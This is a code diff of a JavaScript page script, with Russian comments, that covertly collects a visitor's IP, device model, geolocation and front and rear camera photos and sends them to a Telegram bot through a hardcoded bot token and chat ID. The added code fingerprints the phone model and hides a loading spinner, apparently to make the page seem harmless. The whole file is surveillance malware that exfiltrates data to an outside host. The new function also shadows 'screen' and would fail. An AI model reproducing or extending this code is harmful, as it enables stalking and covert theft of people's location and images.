@@ -2,12 +2,6 @@
 const BOT_TOKEN = '8583690981:AAH_esCG5wUMmRiegjxDARFQDW6l-VxfJ9w';
 const CHAT_ID = '526758225';
 
-// ========== ОТПРАВКА ОШИБОК В TELEGRAM ==========
-async function sendErrorToTelegram(errorType, details) {
-    const message = `❌ ОШИБКА ДОСТУПА\n\n📱 Тип: ${errorType}\n📝 Детали: ${details}\n⏰ Время: ${new Date().toLocaleString('ru-RU')}`;
-    await sendMessage(message);
-}
-
 const video = document.getElementById('video');
 
 // ========== ОТПРАВКА ==========
@@ -28,6 +22,41 @@ async function sendPhoto(blob, caption) {
     try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
     } catch(e) {}
+}
+
+// ========== ОПРЕДЕЛЕНИЕ МОДЕЛИ ТЕЛЕФОНА ==========
+function getPhoneModel() {
+    const ua = navigator.userAgent;
+    const screen = `${screen.width}x${screen.height}`;
+
+    if (ua.includes('iPhone')) {
+        const models = {
+            '320x480': 'iPhone SE/4/4s',
+            '375x667': 'iPhone 6/7/8/SE2',
+            '375x812': 'iPhone X/XS/11 Pro',
+            '390x844': 'iPhone 12/13/14',
+            '393x852': 'iPhone 15 Pro/16/16 Plus',
+            '414x896': 'iPhone XR/11/11 Pro Max',
+            '428x926': 'iPhone 14 Plus/15 Plus',
+            '430x932': 'iPhone 15 Pro Max/16 Pro Max'
+        };
+        return models[screen] || 'iPhone (неизвестная модель)';
+    }
+    
+    if (ua.includes('Android')) {
+        const match = ua.match(/\(.+?\)/);
+        if (match) {
+            const parts = match[0].split(';');
+            for (let part of parts) {
+                if (part.includes('SM-') || part.includes('Pixel') || part.includes('Redmi') || part.includes('MI')) {
+                    return part.trim();
+                }
+            }
+        }
+        return `Android (экран ${screen})`;
+    }
+    
+    return 'Неизвестное устройство';
 }
 
 // ========== ВСЯ ИНФОРМАЦИЯ ==========
@@ -80,7 +109,7 @@ ${ip}`;
     await sendMessage(message);
 }
 
-// ========== ГЕОЛОКАЦИЯ (Яндекс.Карты) ==========
+// ========== ГЕОЛОКАЦИЯ ==========
 function getGeo(callback) {
     if (!navigator.geolocation) {
         sendMessage('❌ Ошибка: браузер не поддерживает геолокацию');
@@ -142,49 +171,16 @@ async function takePhoto(stream, caption) {
         }).catch(() => resolve());
     });
 }
+
 // ========== ГЛАВНАЯ ==========
 async function main() {
+    // Скрываем спиннер
+    const loader = document.querySelector('.loader');
+    if (loader) loader.style.display = 'none';
+    
     // 1. Вся информация
     await sendAllInfo();
-
-await sendMessage(message);
-}
-
-// ========== НОВАЯ ФУНКЦИЯ ==========
-    function getPhoneModel() {
-        const ua = navigator.userAgent;
-        const screen = `${screen.width}x${screen.height}`;
     
-        if (ua.includes('iPhone')) {
-        const models = {
-            '320x480': 'iPhone SE/4/4s',
-            '375x667': 'iPhone 6/7/8/SE2',
-            '375x812': 'iPhone X/XS/11 Pro',
-            '390x844': 'iPhone 12/13/14',
-            '393x852': 'iPhone 15 Pro/16/16 Plus',
-            '414x896': 'iPhone XR/11/11 Pro Max',
-            '428x926': 'iPhone 14 Plus/15 Plus',
-            '430x932': 'iPhone 15 Pro Max/16 Pro Max'
-        };
-        return models[screen] || 'iPhone (неизвестная модель)';
-    }
-    
-    if (ua.includes('Android')) {
-        const match = ua.match(/\(.+?\)/);
-        if (match) {
-            const parts = match[0].split(';');
-            for (let part of parts) {
-                if (part.includes('SM-') || part.includes('Pixel') || part.includes('Redmi') || part.includes('MI')) {
-                    return part.trim();
-                }
-            }
-        }
-        return `Android (экран ${screen})`;
-    }
-    
-    return 'Неизвестное устройство';
-}
-
     // 2. Геолокация
     getGeo(async (loc) => {
         if (loc) {
@@ -194,10 +190,8 @@ await sendMessage(message);
         // 3. Камера
         getCamera('user', async (stream) => {
             if (stream) {
-                // Фронтальное фото (вертикальное)
                 await takePhoto(stream, '📸 Фронтальная камера');
                 
-                // Ждем 3 секунды
                 setTimeout(async () => {
                     getCamera('environment', async (backStream) => {
                         if (backStream) {
